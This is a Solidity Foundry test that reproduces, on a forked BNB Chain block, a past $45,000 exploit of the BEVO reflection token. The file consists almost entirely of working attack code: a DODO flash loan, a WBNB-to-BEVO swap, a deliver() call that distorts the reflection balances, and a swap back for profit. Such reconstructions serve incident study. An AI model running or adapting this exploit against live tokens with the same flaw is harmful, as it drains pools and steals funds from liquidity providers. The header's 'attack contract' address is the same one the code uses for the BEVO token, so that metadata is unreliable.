// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./interface/cheat.sol";
import "./interface/IERC20.sol";
import "./interface/IWBNB.sol";
import "./interface/IPancakePair.sol";
import "./interface/IPancakeRouter02.sol";
import "./interface/IDODO.sol";

// Total Lost: $45,000
// Chain: BNB
// Attacker: 0xd3455773c44bf0809e2aeff140e029c632985c50
// Attack Contract: 0xc6cb12df4520b7bf83f64c79c585b8462e18b6aa
// Attack Tx: https://bscscan.com/tx/0xb97502d3976322714c828a890857e776f25c79f187a32e2d548dda1c315d2a7d
// Vulnerable Contract: 0x32B166e082993Af6598a89397E82e123ca44e74E

contract BEVOExp is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Token Bevo = Token(0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa);
    IPancakeRouter02 constant router =
        IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair WBNB_BEVO_pair =
        IPancakePair(0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633);
    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IDODO constant flashLoanPool =
        IDODO(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);

    function setUp() public {
        cheats.createSelectFork("bsc", 25230702);
    }

    function testExp() public {
        console2.log("The state of BEVO token: ");
        uint256 _tTotal = Bevo.totalSupply();
        uint256 _tOwned = Bevo.balanceOf(address(WBNB_BEVO_pair));
        console2.log("_tTotal: ", _tTotal);
        console2.log(
            "_rTotal(reflectionFromToken): ",
            Bevo.reflectionFromToken(_tTotal, false)
        );
        console2.log("Balance of pair(Bevo)", _tOwned);
        // 已经超发
        // console2.log(
        //     "Balance of pair(Bevo)",
        //     Bevo.reflectionFromToken(_tOwned, false)
        // );
        console2.log(
            "Balance of pair(WBNB)",
            wbnb.balanceOf(address(WBNB_BEVO_pair))
        );
        flashLoanPool.flashLoan(865 * 10 ** 18, 0, address(this), "0x00");
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        _flashLoanCallBack(sender, baseAmount, quoteAmount, data);
    }

    function _flashLoanCallBack(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) public {
        console2.log("In flashloan ...");
        console2.log(
            "Balance of this(WBNB)",
            wbnb.balanceOf(address(this)) / 10 ** 18
        );
        // swap WBNB -> BEVO
        wbnb.approve(address(router), wbnb.balanceOf(address(this)));
        address[] memory path1 = new address[](2);
        path1[0] = address(wbnb);
        path1[1] = address(Bevo);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnb.balanceOf(address(this)),
            0,
            path1,
            address(this),
            block.timestamp
        );
        console2.log(
            "After swap1, the balance of this(Bevo): ",
            Bevo.balanceOf(address(this))
        );
        console2.log(
            "After swap1, the balance of pair(Bevo): ",
            Bevo.balanceOf(address(WBNB_BEVO_pair))
        );
        // deliver
        Bevo.deliver(Bevo.balanceOf(address(this)));
        console2.log(
            "After deliver1, the balance of this(Bevo): ",
            Bevo.balanceOf(address(this))
        );
        console2.log(
            "After deliver1, the balance of pair(Bevo): ",
            Bevo.balanceOf(address(WBNB_BEVO_pair))
        );
        // // skim
        // WBNB_BEVO_pair.skim(address(this));
        // console2.log(
        //     "After skim1, the balance of this(Bevo): ",
        //     Bevo.balanceOf(address(this))
        // );
        // console2.log(
        //     "After skim1, the balance of pair(Bevo): ",
        //     Bevo.balanceOf(address(WBNB_BEVO_pair))
        // );
        // // deliver
        // Bevo.deliver(Bevo.balanceOf(address(this)));
        // console2.log(
        //     "After deliver2, the balance of this(Bevo): ",
        //     Bevo.balanceOf(address(this))
        // );
        // console2.log(
        //     "After deliver2, the balance of pair(Bevo): ",
        //     Bevo.balanceOf(address(WBNB_BEVO_pair))
        // );
        // swap BEVO -> WBNB
        Bevo.approve(address(router), Bevo.balanceOf(address(this)));
        address[] memory path2 = new address[](2);
        path2[0] = address(Bevo);
        path2[1] = address(wbnb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            Bevo.balanceOf(address(this)),
            0,
            path2,
            address(this),
            block.timestamp
        );
        console2.log(
            "After swap2, the balance of this(wbnb): ",
            wbnb.balanceOf(address(this)) / 10 ** 18
        );
        console2.log(
            "After swap2, the balance of pair(wbnb): ",
            wbnb.balanceOf(address(WBNB_BEVO_pair)) / 10 ** 18
        );

        //Return funds
        bool success = wbnb.transfer(address(flashLoanPool), baseAmount);
        if (success) {
            console2.log("Flashloan payback success");
            console2.log(
                "After attack, wbnb balance of this: ",
                wbnb.balanceOf(address(this)) / 1e18
            );
        }
    }
}

interface Token is IERC20 {
    function reflectionFromToken(
        uint256 tAmount,
        bool deductTransferFee
    ) external view returns (uint256);

    function tokenFromReflection(
        uint256 rAmount
    ) external view returns (uint256);

    function burn(uint256 _value) external;

    function deliver(uint256 tAmount) external;
}
